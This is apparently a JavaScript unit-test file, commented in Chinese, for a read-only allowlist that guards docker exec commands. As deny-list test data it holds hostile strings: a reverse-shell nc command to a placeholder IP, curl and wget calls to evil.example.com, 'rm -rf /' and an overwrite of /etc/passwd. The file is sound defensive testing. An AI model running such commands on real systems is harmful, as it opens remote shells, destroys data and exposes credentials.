import assert from 'node:assert/strict';
import test from 'node:test';
import { READONLY_EXEC, assertReadonlyExecutable } from '../src/lib/docker-exec.js';

test('只读白名单允许系统信息类命令', () => {
  for (const cmd of [
    'env', 'printenv', 'ps', 'ps aux', 'top -b -n 1', // top 仅允许单次采样(-n 1)
    'netstat -tulpn', 'ss -tulpn', 'cat /etc/os-release', 'head -100 /var/log/app.log',
    'tail -50 /var/log/app.log', 'ls -la', 'df -h', 'du -sh /data', 'free -m',
    'uptime', 'uname -a', 'hostname', 'date', 'whoami', 'id', 'ip addr',
    'ping -c 4 127.0.0.1',
  ]) {
    assert.match(cmd, READONLY_EXEC, `应允许:${cmd}`);
  }
});

test('只读白名单拒绝有副作用的命令', () => {
  for (const cmd of [
    'rm -rf /', 'curl http://evil.example.com', 'wget http://evil.example.com',
    'echo hi > /etc/passwd', 'kill 1', 'nc -e /bin/sh 1.2.3.4', 'top -b -n 9999',
    'systemctl stop docker', 'apt-get install x', 'mv /etc/hosts /tmp/h',
  ]) {
    assert.doesNotMatch(cmd, READONLY_EXEC, `应拒绝:${cmd}`);
  }
});

test('assertReadonlyExecutable 对空命令与越权命令抛错', () => {
  // 空输入经 split 得 [''],落在白名单外 → 报"仅允许执行只读探测命令"。
  assert.throws(() => assertReadonlyExecutable(''), /仅允许执行只读探测命令/);
  assert.throws(() => assertReadonlyExecutable('   '), /仅允许执行只读探测命令/);
  assert.throws(() => assertReadonlyExecutable(null), /仅允许执行只读探测命令/);
  assert.throws(() => assertReadonlyExecutable('curl http://x'), /仅允许执行只读探测命令/);
  assert.throws(() => assertReadonlyExecutable('rm -rf /'), /仅允许执行只读探测命令/);
  assert.doesNotThrow(() => assertReadonlyExecutable('ps aux'));
});

test('白名单按命令首 token 锚定校验,防子串/拼接绕过', () => {
  // 校验发生在首 token:首个二进制名命中白名单即放行,后续只读参数不受限。
  assert.doesNotThrow(() => assertReadonlyExecutable('ps aux'));
  assert.doesNotThrow(() => assertReadonlyExecutable('cat /etc/passwd'));
  assert.doesNotThrow(() => assertReadonlyExecutable('cat    /a/b'));
  // 首个 token 不在白名单即拒绝,哪怕内含白名单子串(如 xcat / evilnetstat)。
  assert.throws(() => assertReadonlyExecutable('xcat /etc/passwd'), /仅允许/);
  assert.throws(() => assertReadonlyExecutable('evilnetstat -tulpn'), /仅允许/);
});
